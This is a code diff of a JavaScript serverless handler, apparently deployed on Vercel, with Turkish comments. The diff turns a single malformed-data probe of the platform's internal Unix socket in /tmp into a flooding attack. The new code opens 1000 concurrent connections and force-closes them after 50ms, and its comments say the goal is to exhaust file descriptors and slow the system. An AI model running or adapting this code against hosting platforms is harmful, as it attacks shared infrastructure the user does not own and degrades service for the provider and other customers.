@@ -6,41 +6,43 @@ export default async function handler(req, res) {
   const socketPath = tmpFiles.find(f => f.startsWith('vercel-') && f.endsWith('.sock'));
   
   if (!socketPath) {
-    return res.status(200).json({ hata: "Soket dosyası bulunamadı. Vercel hattı gizlemiş olabilir." });
+    return res.status(200).json({ hata: "Soket bulunamadi!" });
   }
 
   const fullPath = `/tmp/${socketPath}`;
-  let report = [];
-
-  // Sokete bağlanıp "Anlamsız/Bozuk" veri gönderiyoruz (Fuzzing)
-  const probeSocket = () => {
-    return new Promise((resolve) => {
-      const client = net.createConnection(fullPath);
-      
-      client.on('connect', () => {
-        // Vercel'in beklemediği devasa veya bozuk bir JSON gönderiyoruz
-        const malformedData = Buffer.alloc(1024 * 5, 'A'); // 5KB'lık 'A' harfi
-        client.write(malformedData);
-        report.push("Bağlantı kuruldu, bozuk veri gönderildi.");
-        client.destroy();
-      });
-
-      client.on('error', (err) => {
-        report.push(`Hata yakalandı: ${err.message}`);
-        resolve();
-      });
-
-      client.on('close', () => resolve());
-      setTimeout(() => resolve(), 1000); // 1 saniye sonra pes et
-    });
+  const start = Date.now();
+  
+  // --- SALDIRI KODU BURADA BAŞLIYOR ---
+  const attack = async () => {
+    const promises = [];
+    for(let i = 0; i < 1000; i++) { // Sayıyı 1000'e çıkardık, baskıyı artıralım
+      promises.push(new Promise((resolve) => {
+        const client = net.createConnection(fullPath);
+        
+        // Hataları yutuyoruz ki döngü kırılmasın
+        client.on('error', () => resolve()); 
+        
+        // Bağlanmaya çalışırken veri gönder
+        client.write(JSON.stringify({ type: "ping", data: "A".repeat(100) }));
+        
+        // 50ms sonra zorla kapat ki kaynakları (File Descriptors) biz tüketelim
+        setTimeout(() => {
+          client.destroy();
+          resolve();
+        }, 50);
+      }));
+    }
+    await Promise.all(promises);
   };
 
-  await probeSocket();
+  await attack();
+  const end = Date.now();
+  // --- SALDIRI KODU BURADA BİTİYOR ---
 
   res.status(200).json({
-    hedef_soket: fullPath,
-    aksiyon: "Socket Manipulation Attempted",
-    sonuc_raporu: report,
-    sistem_notu: "Eğer hata mesajında 'EACCES' (Erişim Engellendi) dışında bir şey görürsek, hattı bozmuşuz demektir."
+    hedef: fullPath,
+    aksiyon: "Socket Flooding Completed",
+    gecen_sure: `${end - start}ms`,
+    not: "Eğer bu süre çok uzunsa (5 saniye üstü), sistemi yavaşlatmayı başardın demektir!"
   });
 }
